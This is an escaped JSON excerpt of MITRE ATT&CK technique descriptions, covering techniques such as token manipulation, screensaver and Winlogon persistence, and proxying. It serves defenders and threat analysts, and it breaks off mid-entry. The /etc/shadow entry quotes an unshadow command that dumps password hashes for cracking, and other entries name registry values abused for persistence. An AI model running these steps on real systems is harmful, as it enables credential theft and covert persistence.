\"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-03-29T19:00:55.901Z\", \"name\": \"Service Stop\", \"attack_pattern_identifier\": \"T1489\", \"description\": \"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \\n\\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)\", \"modified\": \"2020-07-24T15:36:08.042Z\", \"id\": \"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\"}, \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Access Token Manipulation\", \"attack_pattern_identifier\": \"T1134\", \"description\": \"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\\n\\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\\n\\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.\", \"modified\": \"2020-04-16T19:37:02.355Z\", \"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\"}, \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:08.479Z\", \"name\": \"Proxy\", \"attack_pattern_identifier\": \"T1090\", \"description\": \"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\\n\\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\", \"modified\": \"2020-10-21T17:54:28.531Z\", \"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\"}, \"attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-09T12:51:45.570Z\", \"name\": \"Exfiltration Over Web Service\", \"attack_pattern_identifier\": \"T1567\", \"description\": \"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\\n\\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.\", \"modified\": \"2020-03-28T01:02:24.276Z\", \"id\": \"attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807\"}, \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-11T18:48:28.456Z\", \"name\": \"Credentials from Password Stores\", \"attack_pattern_identifier\": \"T1555\", \"modified\": \"2020-03-25T18:40:15.564Z\", \"description\": \"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.\", \"id\": \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\"}, \"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T17:48:58.999Z\", \"name\": \"Path Interception by Search Order Hijacking\", \"attack_pattern_identifier\": \"T1574.008\", \"description\": \"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\\n\\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\\n\\nFor example, \\\"example.exe\\\" runs \\\"cmd.exe\\\" with the command-line argument <code>net user</code>. An adversary may place a program called \\\"net.exe\\\" within the same directory as example.exe, \\\"net.exe\\\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \\\"net.com\\\" in the same directory as \\\"net.exe\\\", then <code>cmd.exe /C net user</code> will execute \\\"net.com\\\" instead of \\\"net.exe\\\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\\n\\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\", \"modified\": \"2020-09-17T19:03:35.217Z\", \"id\": \"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\"}, \"attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T13:51:01.210Z\", \"name\": \"Screensaver\", \"attack_pattern_identifier\": \"T1546.002\", \"description\": \"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\\\Windows\\\\System32\\\\</code>, and <code>C:\\\\Windows\\\\sysWOW64\\\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\\n\\nThe following screensaver settings are stored in the Registry (<code>HKCU\\\\Control Panel\\\\Desktop\\\\</code>) and could be manipulated to achieve persistence:\\n\\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\\n\\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)\", \"modified\": \"2020-03-23T12:23:04.955Z\", \"id\": \"attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf\"}, \"attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-10T20:43:10.239Z\", \"name\": \"Match Legitimate Name or Location\", \"attack_pattern_identifier\": \"T1036.005\", \"description\": \"Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.\\n\\nAdversaries may also use the same icon of the file they are trying to mimic.\", \"modified\": \"2020-06-20T22:11:45.970Z\", \"id\": \"attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2\"}, \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T20:32:20.810Z\", \"name\": \"Disable or Modify Tools\", \"attack_pattern_identifier\": \"T1562.001\", \"modified\": \"2020-03-29T21:52:43.151Z\", \"description\": \"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.\", \"id\": \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\"}, \"attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Supply Chain Compromise\", \"attack_pattern_identifier\": \"T1195\", \"description\": \"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\\n\\nSupply chain compromise can take place at any stage of the supply chain including:\\n\\n* Manipulation of development tools\\n* Manipulation of a development environment\\n* Manipulation of source code repositories (public or private)\\n* Manipulation of source code in open-source dependencies\\n* Manipulation of software update/distribution mechanisms\\n* Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) \\n* Replacement of legitimate software with modified versions\\n* Sales of modified/counterfeit products to legitimate distributors\\n* Shipment interdiction\\n\\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)\", \"modified\": \"2020-10-13T12:38:32.426Z\", \"id\": \"attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7\"}, \"attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:28.187Z\", \"name\": \"Remote System Discovery\", \"attack_pattern_identifier\": \"T1018\", \"modified\": \"2020-09-17T12:26:53.669Z\", \"description\": \"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\\\\Windows\\\\System32\\\\Drivers\\\\etc\\\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \\n\\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.\", \"id\": \"attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735\"}, \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-02T14:19:22.609Z\", \"name\": \"Data Manipulation\", \"attack_pattern_identifier\": \"T1565\", \"description\": \"Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\\n\\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\", \"modified\": \"2020-03-28T23:16:20.202Z\", \"id\": \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\"}, \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:12.196Z\", \"name\": \"Account Manipulation\", \"attack_pattern_identifier\": \"T1098\", \"description\": \"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\", \"modified\": \"2020-10-05T16:43:29.473Z\", \"id\": \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\"}, \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T16:59:59.688Z\", \"name\": \"Winlogon Helper DLL\", \"attack_pattern_identifier\": \"T1547.004\", \"modified\": \"2020-04-21T16:00:41.277Z\", \"description\": \"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\\\Software[\\\\\\\\Wow6432Node\\\\\\\\]\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> and <code>HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \\n\\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\\n\\n* Winlogon\\\\Notify - points to notification package DLLs that handle Winlogon events\\n* Winlogon\\\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\\n* Winlogon\\\\Shell - points to explorer.exe, the system shell executed when a user logs on\\n\\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\", \"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\"}, \"attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-12-28T21:59:02.181Z\", \"name\": \"Domain Trust Modification\", \"attack_pattern_identifier\": \"T1484.002\", \"description\": \"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\\n\\nManipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.\", \"modified\": \"2021-01-11T18:21:20.213Z\", \"id\": \"attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee\"}, \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Deobfuscate/Decode Files or Information\", \"attack_pattern_identifier\": \"T1140\", \"description\": \"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\\n\\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)\", \"modified\": \"2020-07-09T14:42:23.122Z\", \"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\"}, \"attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-01-31T02:10:08.261Z\", \"name\": \"Execution Guardrails\", \"attack_pattern_identifier\": \"T1480\", \"description\": \"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\\n\\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\", \"modified\": \"2020-06-24T18:52:12.956Z\", \"id\": \"attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852\"}, \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:13.915Z\", \"name\": \"Web Service\", \"attack_pattern_identifier\": \"T1102\", \"modified\": \"2020-03-26T23:26:10.297Z\", \"description\": \"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\\n\\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\", \"id\": \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\"}, \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T01:41:08.652Z\", \"name\": \"Code Signing Certificates\", \"attack_pattern_identifier\": \"T1587.002\", \"description\": \"Before compromising a victim, adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\\n\\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.\", \"modified\": \"2020-10-15T01:15:54.945Z\", \"id\": \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\"}, \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.307Z\", \"name\": \"System Information Discovery\", \"attack_pattern_identifier\": \"T1082\", \"modified\": \"2020-03-26T18:17:42.298Z\", \"description\": \"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\\n\\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\", \"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\"}, \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-11-27T14:58:00.429Z\", \"name\": \"Scheduled Task\", \"attack_pattern_identifier\": \"T1053.005\", \"description\": \"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\\n\\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\\n\\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\", \"modified\": \"2020-03-24T13:45:03.730Z\", \"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\"}, \"attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:51:11.772Z\", \"name\": \"Exfiltration to Code Repository\", \"attack_pattern_identifier\": \"T1567.001\", \"description\": \"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\\n\\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. \", \"modified\": \"2020-03-28T00:58:55.433Z\", \"id\": \"attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7\"}, \"attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-02T19:15:44.182Z\", \"name\": \"Spearphishing Link\", \"attack_pattern_identifier\": \"T1566.002\", \"description\": \"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \\n\\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)\", \"modified\": \"2020-10-18T01:53:39.818Z\", \"id\": \"attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7\"}, \"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T19:41:37.908Z\", \"name\": \"DLL Side-Loading\", \"attack_pattern_identifier\": \"T1574.002\", \"description\": \"Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.\\n\\nPrograms may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)\\n\\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.\", \"modified\": \"2020-10-17T15:15:27.807Z\", \"id\": \"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\"}, \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Network Share Discovery\", \"attack_pattern_identifier\": \"T1135\", \"description\": \"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \\n\\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.\", \"modified\": \"2020-10-07T18:10:06.463Z\", \"id\": \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\"}, \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-09-16T17:52:44.147Z\", \"name\": \"Software Discovery\", \"attack_pattern_identifier\": \"T1518\", \"description\": \"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).\", \"modified\": \"2020-09-16T19:36:17.133Z\", \"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\"}, \"attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-19T16:10:15.008Z\", \"name\": \"Additional Cloud Credentials\", \"attack_pattern_identifier\": \"T1098.001\", \"description\": \"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\\n\\nAdversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\\n\\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\", \"modified\": \"2020-12-18T14:57:07.625Z\", \"id\": \"attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd\"}, \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:46:56.263Z\", \"name\": \"/etc/passwd and /etc/shadow\", \"attack_pattern_identifier\": \"T1003.008\", \"description\": \"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\\n\\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\\n\", \"modified\": \"2020-03-20T15:56:55.022Z\", \"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\"}, \"attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-08-30T13:01:10.120Z\", \"name\": \"Cloud Service Discovery\", \"attack_pattern_identifier\": \"T1526\", \"modified\": \"2020-06-23T14:31:41.758Z\", \"description\": \"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. \\n\\nAdversaries may attempt to discover information about the services enabled 